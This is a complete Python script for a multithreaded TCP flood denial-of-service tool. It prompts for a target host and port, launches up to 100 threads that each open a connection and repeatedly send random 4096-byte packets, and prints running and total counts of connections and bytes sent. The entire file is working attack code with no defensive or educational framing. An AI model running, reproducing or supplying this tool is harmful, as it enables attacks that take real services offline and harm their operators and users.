import threading
import random
import socket
import time

class vars:
    max_threads: int = 100
    pkt_size: int = 4096
    timeout: int = 2
    delay: int = 1

    active_threads: int = 0
    connected: int = 0
    pks: int = 0

    total_connected: int = 0
    total_pks: int = 0

    status_code: int = 0

def flood(host: str, port: int) -> None:
    try:
        vars.active_threads += 1
        connected = False
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(vars.timeout)
        sock.connect((host, port))
        connected = True
        vars.connected += 1
        vars.total_connected += 1
        while vars.status_code == 0:
            packet = random._urandom(vars.pkt_size)
            sent = sock.send(packet)
            vars.pks += sent
            vars.total_pks += sent
            time.sleep(vars.delay)
    except Exception:
        pass
    finally:
        vars.active_threads -= 1
        if connected:
            vars.connected -= 1

def attack_initializer(host: str, port: int) -> None:
    try:
        while True:
            if vars.active_threads >= vars.max_threads:
                continue
            threading.Thread(target=flood, args=[host, port], daemon=True).start()
    except Exception:
        pass
    finally:
        vars.status_code = 1

def bytecount(bytesize: int) -> str:
    if bytesize >= 1000000000000:
        total = f"{(bytesize / 1000000000000):.2f} TB"
    elif bytesize >= 1000000000:
        total = f"{(bytesize / 1000000000):.2f} GB"
    elif bytesize >= 1000000:
        total = f"{(bytesize / 1000000):.2f} MB"
    elif bytesize >= 1000:
        total = f"{(bytesize / 1000):.2f} kB"
    else:
        total = f"{(bytesize):.2f} B"
    return total

def main():
    try:
        host = input("Host: ")
        port = int(input("Port: "))
        host = socket.gethostbyname(host)
        threading.Thread(target=attack_initializer, args=[host, port], daemon=True).start()
        while True:
            if vars.status_code != 0:
                if vars.status_code == 1:
                    print(f"[PROGRAM] -> ERROR: ATTACK INITIALIZER HAS BEEN STOPPED")
                    break
                else:
                    print(f"[PROGRAM] -> ERROR: UNKOWN ERROR")
                    break
            print(f"T -> {vars.active_threads}; C -> {vars.connected}; P -> {bytecount(vars.pks)};")
            vars.pks = 0
            time.sleep(1)
    except KeyboardInterrupt:
        exit()
    finally:
        vars.status_code = 1
        print(f"\r\n\r\n[STATISTICS]\r\nT_CONNECTED -> {vars.total_connected}\r\nT_PKS -> {bytecount(vars.total_pks)}\r\n")

if __name__ == "__main__":
    main()
